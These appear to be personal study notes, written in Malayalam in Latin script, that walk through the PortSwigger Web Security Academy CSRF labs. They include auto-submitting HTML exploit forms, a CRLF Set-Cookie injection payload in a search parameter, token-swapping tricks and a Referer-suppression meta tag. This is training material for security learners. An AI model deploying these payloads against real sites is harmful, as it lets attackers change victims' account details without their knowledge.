## Cross-site request forgery:
-->enthengilum actionss nadakuna sthalangalil aan csrf work akunath
-->actions nadakanengil pala http requests serveril nadakum angane flow il nadakan session cookie aan use chyuka.
-->cookies use chyth mathrame oru userinte authorization server noku allathe vere oru reethiyum illa
-->koodathe unpredictable parameter/value undakanum padila.ie,email change chyuna samayath /POST req il last email=test@test.com  enn mathrame undakan padulu.allathe email paremeter il intekoode vere parameter undakan padila angaane undayal csrf work aakila. athayath email parameter inte koode oru csrf enna oru parameter undayal athil oru value undakum so server aa value check chyum same allengil accept chyila
-->csrf token upayogikumbol web application cookie session il mathram rely chyathe ee csrf token koodu use chyth safety urapp varuthunund


       Lab-1(CSRF vulnerability with no defenses)
-->ivide namal wiener:peter adich keruka
-->avide update email enna option und athil puthiya email koduth change chyuka
-->ini aa change chyuna /POST req studey chyuka athil nokiyal kanam session cookie und but etavum thazhe aayi email parameter mathrame ulloo koode csrf polul random number illa
-->so ini aa request repeateril onum idathe thane right click chyth ->engagement tool->
generate csrf poc click chythal namuk csrf inte html code kitum mukalil options select chyth include autosubmit script select chyuka
-->ini aa csrf html code copy chyth exploit serveril iduka enit store chyuka
-->ith work aakunundon nokan view-exploit select chyth submit button click chythal namude email marunath kanam
-->so ini deliver exploit to victim adichal lab solve aakum

==============================================================

        Lab-2(CSRF where token validation depends on request method)
-->ividem namal email change chyunathil aan csrf ullath
-->change chyuna request repeater ilek viduka
-->enit athile csrf token remove chyth test chyuka error verum 
-->ini rand reetiyil chyan onn namuk thane POST ennath mati GET aaki test chyam apol 302 found enn kanikunund.so athinartham GET request aakiyalum action nadakunund
-->so GET req aakit athile csrf token remove chyth send adikumbol namuk email chagne chyan patunund
-->so aa request right click chyth csrf poc aakuka enit auto submit options il ninum aaki exploit server il aaki deliver to victim aakiyal lab solve aakum

==============================================================

     Lab-3(CSRF where token validation depends on token being present)
-->ividem email change chyunathan nokunath
-->change chyuna request repeater il iduka enit thazhe csrf=kjhdgpakdjs... kanum so ath angane thane remove chyth send adichal 302 found enn kanikum
-->athayath ivide server csrf parameter check chyunila
-->so ee reqeust csrf poc aaki exploit server il poi deliver to victim adichal lab solve aayi

==============================================================

      Lab-4(CSRF where token is not tied to user session)
-->ivide namal email change chynathan nokunath
-->ivide nerthe chythathpole aakila
-->but namuk puthiya oru technique use chyam.athayath csrf session cookie yumayi connection illengil namuk namude csrf mati vere oru account inte csrf athil maativech email change chyan patum
-->satharana csrf um session cookie yum thamil connection undakum.ennalum chela site undakanamenila
-->ivide ath undon check chyan namal matoru account use chyunu(carlos:montoya).so carlos aayi login chythit email change chyuna aa formil inspect element chyumbol avide csrf=kfkdajf... enna token kanam so aa token copy chyth namude repeater il ulla email change chyuna request ile csrf il replace chyth paste chyuka
-->ini send adikumbol namuk kanam 302 found enn enit follow redirection adich nokiyal email change chyththayi namuk kanam
-->so namal ee redirection aayi kitiya request alla pakaram athin mumb athayath csrf paste chytha request eduth csrf poc eduth html code copy chyth exploit server il paste chyth deliver to victim aichal namuk lab solve aakunath kanam

==============================================================

       Lab-5(CSRF where token is tied to non-session cookie)
-->ividem namal email change chyuna reqeust il aan paniyunath
-->ivide csrf token in purame oru non-session cookie koodi und ie, cookie : session=sdlkfjsa.... ; csrfkey=ksdfkljsdlkf....    (ee csrfkey aan aa cookie)
-->ee csrfkey cookieyum namude csrf token um tied up aan athayath ee rand sathanangal 
backendil save chythirikuna ee same token,cookie yum equivalent aanengil mathrameapplication accept chyu request
-->so ith randum connected aayathkond thane just csrftoken modify chyth csrf undon nokan patila rand sathanavum vech test chyanam
-->athin aadyam ith thamil connection undon nokanam randinte value onnayiyum pinne orumichum oke change chyth send chyth test chyuka
-->ini kurach koodi advanced aayi test chyam randum thamil connection undon nokam.athin vere oru account aakuka enit aa accountinte csrf eduth ee request ile csrf il iduka.matte csrfkey cookie pazhayath thane idanam mataruth.enit send adikumbol error thane aan varunath.so athinartham ith rand thamil nalla connection undennan
-->ini namuk session cookieyum pine ee rand (ie,csrftoken and csrfkey) thamil connection undon nokam.athin mattoru accountinte csrfkey= cookie yum athupole csrf= token um eduth namude request il replace chyuka.enit send adikumbol 302 kanikum ie application accept chyunund
-->so athinartham session cooke yum ee csrfkey yum thamil connection ila
-->so ivide namuk csrf attack nadathanengil aadyam oru csrfkey cookie idanam script il athin shesham csrf script il oru known genuine aaya csrf token um kodukanam
-->so ithil csrfkey cookie inject chyunathan paad.karanam namal oru place kandethanam ee cookie namuk request il add chyan.matteth namude kayil already oru genuine token ullathkond kozhapamila
-->so namal ee site il search il poi enthengilum type chythal kanam namuk oru puthiya cookie add chyapedunath ie,lastserch=hello enna oru cookie aad aayirikunu
-->so `/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key` enn koduthal namuk oru puthiya http header pole ee set-cookie response il kanikum.ivide %0d ennal puthiya line/next line aan angane namuk putiya oru csrfcookie add chyam athil namude csrf aakiyamathi
-->so ini nerthethe change emai request il thane pokuka enit generate csrf poc adikuka enit athil namude csrf=jlsjf... token kodukuka enit athil autosubmit chyuna script undnegil ath remove chyuka enit avide namuk puthiya csrfkey= cookie add chyanam
-->athin nerthethe search request il pokuka(karanam search req il aan namuk csrfkey cookie add chyan patunath).enit athile host headeril nin correct url edukuka enit oru image element il aakanam
-->ee image element ile src yil nammal puthiya csrfkey cookie undakunu.enit aa requset il thane query parameter koodi edukanam(athayath search query il aanalo inject chyunath athin). athayath nerthe set-cooke vech chytha aa payload add chyanam muikalil nok
-->ithrem namal src="" il chyumbol puthiya csrfkey cookie add aayikolum but ithoru valid image allathathkond onerror il kanikunath nadakum
-->oru karyam sredhikuka namal csrfkey= cookie aayi idunath namude cookie aan
-->script:

          `<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a850042038c4acfc11463af00960012.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="oooooosu&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="5pVeiiyIVHsh7gpYb77Kf2H60xc26ayU" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a850042038c4acfc11463af00960012.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=AW86VCQpWOTNPYPyewEa5NpsrOoxZPs7" onerror="document.forms[0].submit()">
  </body>
</html>
`
==============================================================

        Lab-6(CSRF where token is duplicated in cookie)
-->ividem namal email change chyunathan test chyunath
-->ivide namal change chyuna request eduth repeater il iduka enit nokiyal kanam athil csrf enna cookie kanam athupole thazhe ayyir csrf enn token um kanam
-->randinte value nokiyal kanam same aan.so namal enth chyunu ennal randintem value clear chyth randitum test enn kodukunu enit send adikumbol 302 found enn kanikunu 
-->so server rand csrf um undon enn check chyunu athupole athile value same aano enn check chyunu but value mariyath check chyunila pakaram randilum ore value thane aano enn mathrame check chyunulu
-->csrf cookie ullathkond thane namuk site il evidengilum csrf cookie inject chyanam.nerthe lab il chythapole search il test chyumbol searchil adikunath oru cookie yil aayi save aakunund
--> so `/?search=test%0d%0aSet-Cookie:%20csrf=fake`    namal ee payload search il itt test chyumbol namuk oru puthiya cookie kitum karanam namal ee search query nerthe pole break chyth new line il aaki aan ittath
-->so ipol namuk manasilayi evide aan oru puthiya cookie idan patuka enn
-->ini nerthe same request il poi csrf poc undakukaathil csrf token value enth kodukuno ath thane ee create chyuna csrf cookie lum idanam enit exploit server il ittal aayikolum
-->NOTE: `<img il src= idumbol thudakam https:// idan marakaruth karanm namal pothuve host: header il ninan url copy chyuka athil https enn undakila`

-> SCRIPT:

        <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a3f007403c76cbcc0094b0100fe0030.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="josu&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
      <img src="https://0a3f007403c76cbcc0094b0100fe0030.web-security-academy.net/?search=josu%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();"/>
    </form>
  </body>
</html>

==============================================================

        Lab-7(CSRF where Referer validation depends on header being present)
-->ividem email change chyunathilan test chyunath
-->ivide nokiyal kanam csrf token ila so namuk direct csrf poc undaki chythnokam.
-->csrf poc peten test chyan poc undakit test in browser button click chythal aa csrf script adangiya url kitum athilek poyal kanam email change ayo ilayyo enn.ivide lab7 il ingane test chyumbol `ivalid refere header` enna kanikunath
-->eth page il ninan request originate chythath ennariyan vendi aan referer header use chyunath.ith vazhi csrf prevent chyan kazhiyum.ivide lab7 il host: il site name um referer: header il vere name um aan ullath athukondan ee error varunath.so namal referer header modify oke chyth test chyanam
-->so ivide referer: header ullathkond ath namuk remove chyth test chyam.so repeateril referer header angane thane remove chyth send adikumbol email change chyunund
-->satharana remove chythalonum nadakanamenila.so ini namal onudi poc undakuka.enit ivide referer header vilangthadi aakunathkond script il oru `meta` element head tag il idanam
-->ie `<meta name="referrer" content="no-referrer">`  enn.ingane idumbol referer header application check chyila
-->ini options il poi auto-submit tick iduka
-->ini ith exploit server il itt deliver to victim adichal lab solve aayikolum

-->SCRIPT:
          <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ab30014040694e7c011464200ce003a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="josudfsdf&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

==============================================================

        Lab-8(CSRF with broken Referer validation)
-->ith mansilakan paadulath pole ind so chyunila

